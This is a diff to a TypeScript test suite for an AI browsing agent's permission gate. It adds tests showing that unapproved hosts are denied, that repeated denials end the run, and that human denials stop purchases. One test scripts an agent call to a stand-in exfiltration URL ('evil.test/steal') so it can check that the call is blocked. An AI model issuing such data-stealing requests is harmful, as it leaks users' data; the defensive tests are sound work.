@@ -109,6 +109,7 @@ async function setup(options: { recall?: () => Promise<never>; publicSuffix?: { 
 
 const finish = { tool: "finish", args: { summary: "Done." } };
 const openSite = (url: string) => ({ tool: "open_site", args: { url } });
+const open = (n: number) => ({ tool: "open_url", args: { url: `https://site${n}.test/` } });
 
 describe("agent", () => {
   it("G1: the approval shows the exact action, and only that action runs", async () => {
@@ -129,9 +130,9 @@ describe("agent", () => {
   });
 
   it("G3: another host gets no grant", async () => {
-    const { run, ran } = await setup();
-    const end = await run({ script: [{ tool: "open_url", args: { url: "http://evil.test/steal?c=1" } }, finish] });
-    expect(end).toMatchObject({ status: "blocked", reason: "gate-deny" });
+    const { run, ran, events } = await setup();
+    await run({ script: [{ tool: "open_url", args: { url: "http://evil.test/steal?c=1" } }, finish] });
+    expect(events.find((e) => e.type === "decision")).toMatchObject({ decision: "deny", reason: "no-grant" });
     expect(ran).toEqual([]);
   });
 
@@ -325,6 +326,35 @@ describe("agent", () => {
     expect(loan.requests[1]).toContain('There is no tool \\"click\\"');
   });
 
+  it("G26: a gate denial for another host goes back to the planner, and the run goes on", async () => {
+    const { run, ran, events, requests, trail } = await setup();
+    const end = await run({ script: [{ tool: "open_url", args: { url: "https://www.kayak.com/" } }, { tool: "snapshot", args: {} }, finish] });
+    expect(end.status).toBe("done");
+    expect(ran).toEqual([]);
+    expect(events.find((e) => e.type === "tool-result")).toMatchObject({ name: "open_url", ok: false, reason: "gate-deny" });
+    expect(requests[1]).toContain("no-grant");
+    expect((await trail.entries()).some((e) => e.kind === "loop.decision" && (e.data as { decision?: string }).decision === "deny")).toBe(true);
+  });
+
+  it("G27: the third gate denial in a row ends the run", async () => {
+    const { run, ran } = await setup();
+    const end = await run({ script: [open(1), open(2), open(3), { tool: "snapshot", args: {} }, finish] });
+    expect(end).toMatchObject({ status: "blocked", reason: "gate-deny" });
+    expect(end.message).toMatch(/3 actions in a row/);
+    expect(ran).toEqual([]);
+  });
+
+  it("G28: a human's Deny and a Never allow rule still end the run", async () => {
+    const denied = await setup();
+    const end = await denied.run({ script: [{ tool: "click", args: { button: "Buy" } }, { tool: "snapshot", args: {} }, finish] }, "deny");
+    expect(end).toMatchObject({ status: "blocked", reason: "approval-denied" });
+    const ruled = await setup({ publicSuffix: { getDomain: (h) => h } });
+    await ruled.agent.host.addRule({ site: "shop.test", scope: "submit", effect: "deny" });
+    const stopped = await ruled.run({ script: [{ tool: "click", args: { button: "Buy" } }, { tool: "snapshot", args: {} }, finish] });
+    expect(stopped).toMatchObject({ status: "blocked", reason: "gate-deny" });
+    expect(stopped.message).toMatch(/^rule/);
+    expect(ruled.ran).toEqual([]);
+  });
   it("OS1: with no tab, open_site asks every time, shows the full address, and a rule cannot skip it", async () => {
     const ruled = await setup({ publicSuffix: { getDomain: (h) => h.split(".").slice(-2).join(".") } });
     await ruled.agent.host.addRule({ site: "new-tab.foxmate", scope: "read", effect: "allow" }).catch(() => undefined);
@@ -354,12 +384,14 @@ describe("agent", () => {
   });
 
   it("OS3: a second site moves the grants; the first host gets no grant after that", async () => {
-    const { run, domainsSeen } = await setup();
-    const end = await run({ noTab: true, script: [openSite("https://a.test/"), { tool: "snapshot", args: {} }, openSite("https://b.test/"), { tool: "snapshot", args: {} }, finish] });
+    const { run, events, domainsSeen, ran } = await setup();
+    const end = await run({ noTab: true, script: [openSite("https://a.test/"), { tool: "snapshot", args: {} }, openSite("https://b.test/"), { tool: "snapshot", args: {} }, { tool: "open_url", args: { url: "https://a.test/x" } }, { tool: "snapshot", args: {} }, finish] });
     expect(end.status).toBe("done");
     expect(domainsSeen[0]).toContain("a.test");
     expect(domainsSeen[1]).toContain("b.test");
     expect(domainsSeen[1]).not.toContain("a.test");
+    expect(events.filter((e) => e.type === "decision" && e.decision === "deny" && "action" in e && e.action?.tool === "open_url")).toMatchObject([{ reason: "no-grant" }]);
+    expect(ran).toEqual([]);
   });
 
   it("OS4: a redirect to another site gets no grant; one inside the site grants the loaded host only", async () => {
